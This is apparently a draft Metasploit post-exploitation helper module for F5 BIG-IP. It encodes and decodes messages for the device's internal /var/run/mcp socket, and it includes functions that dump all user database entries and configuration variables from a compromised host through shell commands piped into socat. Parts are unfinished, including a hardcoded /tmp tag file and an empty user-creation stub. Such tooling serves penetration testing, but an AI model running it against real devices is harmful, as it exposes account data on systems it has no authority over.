# Encoding: ASCII-8BIT

# Parse the objects file into a tag->name array
# TODO: We shouldn't do it like this at all
TAGS = File.read('/tmp/mcp-objects.txt')
  .split(/\n/)
  .select { |s| !s.start_with?('#') && s.include?(' ') }
  .map do |l|
    tag, name = l.split(/ /)

    [ name, tag.to_i(16) ]
  end.to_h

  # Parse the objects file into a tag->name array
TAGS2 = File.read('/tmp/mcp-objects.txt')
  .split(/\n/)
  .select { |s| !s.start_with?('#') && s.include?(' ') }
  .map do |l|
    tag, name = l.split(/ /)

    [ tag.to_i(16), name ]
  end.to_h

module Msf
  class Post
    module Linux
      # The F5 mixin implements methods for querying F5's database, which
      # is found at `/var/run/mcp` on Big-IP and other F5 devices
      module F5
        def mcp_send_recv(data)
          # if !file_exist?('/var/run/mcp')
          #   print_warning("Socket /var/run/mcp doesn't exist, probably not a supported host")
          #   return nil
          # end

          # Add a header
          message = [data.length, 0, 0, 0, data].pack('NNNNa*')

          # Encode as base64 so we can pass it on the commandline
          message = Rex::Text.encode_base64(message)

          # Send
          result = cmd_exec("echo '#{message}' | base64 -d | socat -t100 - UNIX-CONNECT:/var/run/mcp")

          if !result || result == ''
            print_warning('Request to /var/run/mcp socket failed')
            return nil
          end

          results = []
          while result.length > 0
            length, header, result = result.unpack('Na12a*')
            packet, result = result.unpack("a#{ length }a*")
            results << mcp_parse(packet)
          end

          results
        end

        # Parse an mcp message from a binary stream into an object
        def mcp_parse(stream)
          result = []

          begin
            while stream.length > 2
              tag, type, stream = stream.unpack('nna*')

              tag  = TAGS2[tag]  || '<unknown tag>'
              type = TAGS2[type] || '<unknown tag>'

              if type == 'structure'
                # Get the length and struct data, then recurse
                length, stream = stream.unpack('Na*')
                struct, stream = stream.unpack("a#{ length }a*")

                result << {
                  tag: tag,
                  value: mcp_parse(struct)
                }
              elsif type == 'string'
                length, otherlength, stream = stream.unpack('Nna*')

                # I'm sure the two length values have a semantic difference, but just check for sanity
                if otherlength + 2 != length
                  raise "Inconsistent string lengths: #{ length } + #{ otherlength }"
                end

                str, stream = stream.unpack("a#{ otherlength }a*")
                result << {
                  tag: tag,
                  value: str
                }
              elsif type == 'uquad'
                value, stream = stream.unpack('Q>a*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'ulong'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'time'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: Time.at(value)
                }
              elsif type == 'uword'
                value, stream = stream.unpack('na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'long'
                value, stream = stream.unpack('Na*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'tag'
                value_tag, stream = stream.unpack('na*')
                result << {
                  tag: tag,
                  value: TAGS2[value_tag]
                }
              elsif type == 'byte'
                value, stream = stream.unpack('Ca*')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'mac'
                value, stream = stream.unpack('a6a*')
                value = value.bytes.map { |b| '%02x' % b }.join(':')
                result << {
                  tag: tag,
                  value: value
                }
              elsif type == 'array'
                length, stream = stream.unpack('Na*')
                array, stream = stream.unpack("a#{ length }a*")

                result << {
                  tag: tag,
                  value: "Array data: #{array.unpack('H*').pop}"
                }
              else
                raise "Unknown type: #{ type }"
                return
              end
            end
          rescue StandardError => e
            print_error(e.message)
            return nil
          end

          result
        end

        # Build an mcp message
        def mcp_build(tag, type, data)
          if TAGS[tag].nil?
            raise "Invalid tag: #{ tag }"
          end
          if TAGS[type].nil?
            raise "Invalid type: #{ type }"
          end

          out = ''
          if type == 'structure'
            out = [data.join.length, data.join].pack('Na*')

            # while (out.length % 4) != 0
            #   out += "\0"
            # end
          elsif type == 'string'
            out = [data.length + 2, data.length, data].pack('Nna*')
          elsif type == 'uquad'
            out = [data].pack('Q>')
          elsif type == 'ulong'
            out = [data].pack('N')
          elsif type == 'uword'
            out = [data].pack('n')
          elsif type == 'long'
            out = [data].pack('N')
          elsif type == 'tag'
            out = [TAGS[data]].pack('n')
          elsif type == 'byte'
            out = [data].pack('C')
          elsif type == 'mac'
            out = [data].pack('a6')
          else
            raise "Unknown type: #{ type }"
          end

          out = [TAGS[tag], TAGS[type], out].pack('nna*')

          return out
        end

        # Query the mcp socket for a list of users
        def mcp_query_all_users()
          # Get the raw result
          result = mcp_send_recv(
            mcp_build('query_all', 'structure', [
              mcp_build('userdb_entry', 'structure', [])
            ])
          )

          # There should only be one response
          if result.length != 1
            print_error("Invalid response returned by mcp: more than one message reply")
            return nil
          end
          result = result.pop

          # There should only be one query result
          if result.length != 1
            print_error("Invalid response returned by mcp: more than one query result")
            return nil
          end
          result = result.pop

          unless result[:tag] == 'query_reply'
            print_error("Invalid tag returned by mcp")
            return nil
          end

          # We only care about the response
          result = result[:value]

          # Structure it into a more sensible format
          result = result.map do |single_result|
            single_result[:value].map do |r|
              [r[:tag], r[:value]]
            end.to_h
          end

          result
        end

        # Query the mcp socket for a list of settings
        def mcp_query_all_db_variable()
          mcp_send_recv(
            mcp_build('query_all', 'structure', [
              mcp_build('db_variable', 'structure', [])
            ])
          )
        end

        def query_mcp_create_user()
        end
      end
    end
  end
end




